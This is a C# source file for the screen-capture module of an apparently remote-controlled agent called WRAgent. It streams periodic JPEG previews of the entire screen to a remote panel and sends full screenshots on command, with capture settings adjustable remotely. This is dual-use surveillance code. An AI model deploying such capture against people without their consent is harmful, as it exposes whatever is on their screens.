using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Text.Json.Nodes;
using System.Windows.Forms;

namespace WRAgent
{
    /// <summary>
    /// Screen preview stream (JPEG binary frames for the panel cards) and
    /// full-quality screenshots on demand.
    /// </summary>
    internal static class CaptureModule
    {
        private static Task _loop;
        private static volatile int _intervalMs = 4000;
        private static volatile int _previewWidth = 640;
        private static volatile int _previewQuality = 45;
        private static volatile bool _paused;

        private static readonly ImageCodecInfo Jpeg = ImageCodecInfo.GetImageEncoders()
            .First(c => c.FormatID == ImageFormat.Jpeg.Guid);

        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        // ------------------------------------------------------------------
        public static void Start()
        {
            try { SetProcessDPIAware(); } catch { }
            _loop ??= Task.Run(Loop);
        }

        private static async Task Loop()
        {
            while (true)
            {
                try
                {
                    if (!_paused && Transport.I.Connected)
                    {
                        var jpg = GrabPreview();
                        if (jpg != null && jpg.Length > 512)
                            await Transport.I.SendBinaryAsync(jpg).ConfigureAwait(false);
                    }
                }
                catch (Exception e)
                {
                    Log.W("preview: " + e.Message);
                }

                await Task.Delay(_intervalMs).ConfigureAwait(false);
            }
        }

        // ------------------------------------------------------------------
        public static byte[] GrabPreview()
        {
            var bounds = SystemInformation.VirtualScreen;
            if (bounds.Width <= 0 || bounds.Height <= 0) return null;

            using var full = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb);
            using (var g = Graphics.FromImage(full))
            {
                g.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size,
                    CopyPixelOperation.SourceCopy);
            }

            var w = Math.Min(_previewWidth, full.Width);
            var h = Math.Max(1, (int)Math.Round(full.Height * (w / (double)full.Width)));

            using var small = new Bitmap(w, h, PixelFormat.Format24bppRgb);
            using (var g = Graphics.FromImage(small))
            {
                g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
                g.PixelOffsetMode = System.Drawing.Drawing2D.PixelOffsetMode.HighSpeed;
                g.DrawImage(full, 0, 0, w, h);
            }

            using var ms = new MemoryStream();
            using var pars = new EncoderParameters(1);
            pars.Param[0] = new EncoderParameter(Encoder.Quality, (long)_previewQuality);
            small.Save(ms, Jpeg, pars);
            return ms.ToArray();
        }

        // ------------------------------------------------------------------
        public static async Task<JsonObject> Shot(JsonObject args, Transport t)
        {
            try
            {
                var monitor = Util.Int(args, "monitor", -1);
                Rectangle bounds;
                if (monitor >= 0 && monitor < Screen.AllScreens.Length)
                    bounds = Screen.AllScreens[monitor].Bounds;
                else
                    bounds = SystemInformation.VirtualScreen;

                using var bmp = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb);
                using (var g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size,
                        CopyPixelOperation.SourceCopy);
                }

                using var ms = new MemoryStream();
                bmp.Save(ms, ImageFormat.Png);
                var data = ms.ToArray();

                var meta = new JsonObject
                {
                    ["name"] = $"screen-{DateTime.Now:yyyyMMdd-HHmmss}.png",
                    ["path"] = "<screen>",
                    ["width"] = bounds.Width,
                    ["height"] = bounds.Height
                };
                await t.EmitBlobAsync("screenshot", meta, data).ConfigureAwait(false);

                return new JsonObject
                {
                    ["ok"] = true,
                    ["stdout"] = $"screenshot {bounds.Width}x{bounds.Height} ({data.Length / 1024} KB)"
                };
            }
            catch (Exception e)
            {
                return new JsonObject { ["ok"] = false, ["error"] = e.Message };
            }
        }

        // ------------------------------------------------------------------
        public static JsonObject Config(JsonObject args)
        {
            var action = Util.Str(args, "action", "status").ToLowerInvariant();
            if (action == "set")
            {
                var ms = Util.Int(args, "interval_ms", 0);
                if (ms >= 500 && ms <= 60000) _intervalMs = ms;
                var q = Util.Int(args, "quality", 0);
                if (q >= 10 && q <= 95) _previewQuality = q;
                var w = Util.Int(args, "width", 0);
                if (w >= 160 && w <= 1920) _previewWidth = w;
                _paused = Util.Bool(args, "paused", false);
            }
            else if (action == "pause") _paused = true;
            else if (action == "resume") _paused = false;

            return new JsonObject
            {
                ["ok"] = true,
                ["stdout"] = $"preview {(_paused ? "paused" : "live")} · {_previewWidth}px · q{_previewQuality} · {_intervalMs}ms",
                ["meta"] = new JsonObject
                {
                    ["interval_ms"] = _intervalMs,
                    ["quality"] = _previewQuality,
                    ["width"] = _previewWidth,
                    ["paused"] = _paused
                }
            };
        }
    }
}
